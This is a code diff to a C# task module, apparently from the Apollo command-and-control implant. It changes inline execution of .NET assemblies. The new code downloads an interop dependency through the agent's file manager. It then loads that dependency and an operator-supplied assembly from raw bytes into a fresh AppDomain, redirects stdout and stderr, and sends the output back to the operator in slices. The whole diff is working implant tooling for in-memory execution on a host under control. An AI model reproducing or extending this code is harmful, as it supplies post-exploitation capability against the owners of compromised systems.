@@ -33,6 +33,8 @@ namespace Tasks
             public string AssemblyName;
             [DataMember(Name = "assembly_arguments")]
             public string AssemblyArguments;
+
+            [DataMember(Name = "interop_id")] public string InteropFileId;
         }
         
         private delegate bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
@@ -53,7 +55,9 @@ namespace Tasks
         private readonly Action<object> _sendAction;
 
         private System.Threading.Tasks.Task _sendTask = null;
-        
+
+        private static string _output = "";
+
         private static bool _completed = false;
         
         
@@ -83,23 +87,19 @@ namespace Tasks
                     {
                         Complete
                     }, 1000);
-                    accumOut = AppDomain.CurrentDomain.GetData("output") as string;
-                    if (!string.IsNullOrEmpty(accumOut))
+                    accumOut = _output;
+                    slicedOut = accumOut.Skip(lastOutLen).Aggregate("", (current, s) => current + s);
+                    lastOutLen = accumOut.Length;
+                    if (!string.IsNullOrEmpty(slicedOut))
                     {
-                        slicedOut = accumOut.Skip(lastOutLen).Aggregate("", (current, s) => current + s);
-                        lastOutLen = accumOut.Length;
-                        if (!string.IsNullOrEmpty(slicedOut))
-                        {
-                            _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse(
-                                slicedOut,
-                                false,
-                                ""));
-                        }
+                        _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse(
+                            slicedOut,
+                            false,
+                            ""));
                     }
                 }
-
-                string finalOut = AppDomain.CurrentDomain.GetData("output") as string;
-                slicedOut = finalOut.Skip(lastOutLen).Aggregate("", (current, s)=> current + s);
+                
+                slicedOut = _output.Skip(lastOutLen).Aggregate("", (current, s)=> current + s);
                 if (!string.IsNullOrEmpty(slicedOut))
                 {
                     _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse(
@@ -167,28 +167,48 @@ namespace Tasks
                      * Output is managed by the _sendTask.
                      */
                     _agent.AcquireOutputLock();
-                    
+                    byte[] interopBytes = new byte[0];
                     InlineAssemblyParameters parameters = _jsonSerializer.Deserialize<InlineAssemblyParameters>(_data.Parameters);
-                    
-                    if (_agent.GetFileManager().GetFileFromStore(parameters.AssemblyName, out byte[] assemblyBytes))
+                    if (!_agent.GetFileManager().GetFileFromStore(parameters.InteropFileId, out interopBytes))
                     {
-                        byte[] ByteData = assemblyBytes;
-                        string[] stringData = string.IsNullOrEmpty(parameters.AssemblyArguments) ? new string[0] : ParseCommandLine(parameters.AssemblyArguments);
-                        _sendTask =
-                            System.Threading.Tasks.Task.Factory.StartNew(_sendAction, _cancellationToken.Token);
-                        if (LoadAppDomainModule(stringData, ByteData))
+                        if (_agent.GetFileManager().GetFile(
+                                _cancellationToken.Token,
+                                _data.ID,
+                                parameters.InteropFileId,
+                                out interopBytes
+                            ))
                         {
-                            resp = CreateTaskResponse("", true);
+                            _agent.GetFileManager().AddFileToStore(parameters.InteropFileId, interopBytes);
+                        }
+                    }
+
+                    if (interopBytes.Length != 0)
+                    {
+                        if (_agent.GetFileManager().GetFileFromStore(parameters.AssemblyName, out byte[] assemblyBytes))
+                        {
+                            byte[] ByteData = assemblyBytes;
+                            string[] stringData = string.IsNullOrEmpty(parameters.AssemblyArguments) ? new string[0] : ParseCommandLine(parameters.AssemblyArguments);
+                            _sendTask =
+                                System.Threading.Tasks.Task.Factory.StartNew(_sendAction, _cancellationToken.Token);
+                            if (LoadAppDomainModule(stringData, ByteData, new byte[][]{ interopBytes }))
+                            {
+                                resp = CreateTaskResponse("", true);
+                            }
+                            else
+                            {
+                                resp = CreateTaskResponse("Failed to load module.", true, "error");
+                            }
                         }
                         else
                         {
-                            resp = CreateTaskResponse("Failed to load module.", true, "error");
-                        }
+                            resp = CreateTaskResponse($"{parameters.AssemblyName} is not loaded (have you registered it?)", true);
+                        }    
                     }
                     else
                     {
-                        resp = CreateTaskResponse($"{parameters.AssemblyName} is not loaded (have you registered it?)", true);
+                        resp = CreateTaskResponse("Failed to get ApolloInterop dependency.", true, "error");
                     }
+                    
                 }
                 catch (Exception ex)
                 {
@@ -208,7 +228,7 @@ namespace Tasks
                     }
 
                     _completed = false;
-                    AppDomain.CurrentDomain.SetData("output", "");
+                    _output = "";
                     _agent.ReleaseOutputLock();
                 }
                 _agent.GetTaskManager().AddTaskResponseToQueue(resp);
@@ -216,11 +236,18 @@ namespace Tasks
         }
         
 #region AppDomain Management
-        private bool LoadAppDomainModule(String[] sParams, Byte[] bMod)
+        private bool LoadAppDomainModule(String[] sParams, Byte[] bMod, Byte[][] dependencies)
         {
             AppDomain isolationDomain = AppDomain.CreateDomain(Guid.NewGuid().ToString());
             isolationDomain.SetData("str", sParams);
             bool defaultDomain = AppDomain.CurrentDomain.IsDefaultAppDomain();
+            foreach(byte[] dependency in dependencies)
+            {
+                try
+                {
+                    isolationDomain.Load(dependency);   
+                } catch {}
+            }
             try
             {
                 isolationDomain.Load(bMod);
@@ -284,21 +311,20 @@ namespace Tasks
 #region Cross AppDomain Loader
         static void ActivateLoader()
         {
-            string output = "";
             string[] str = AppDomain.CurrentDomain.GetData("str") as string[];
             EventableStringWriter stdoutWriter = new EventableStringWriter();
-            // stdoutWriter.BufferWritten += (sender, args) =>
-            // {
-            //     if (!string.IsNullOrEmpty(args.Data))
-            //     {
-            //         output += args.Data;
-            //     }
-            // };
+            stdoutWriter.BufferWritten += (sender, args) =>
+            {
+                if (!string.IsNullOrEmpty(args.Data))
+                {
+                    _output += args.Data;
+                }
+            };
             Console.SetOut(stdoutWriter);
             Console.SetError(stdoutWriter);
             foreach (var asm in AppDomain.CurrentDomain.GetAssemblies())
             {
-                if (!asm.FullName.Contains("mscor"))
+                if (!asm.FullName.Contains("mscor") && !asm.FullName.Contains("Apollo"))
                 {
                     var costuraLoader = asm.GetType("Costura.AssemblyLoader", false);
                     if (costuraLoader != null)
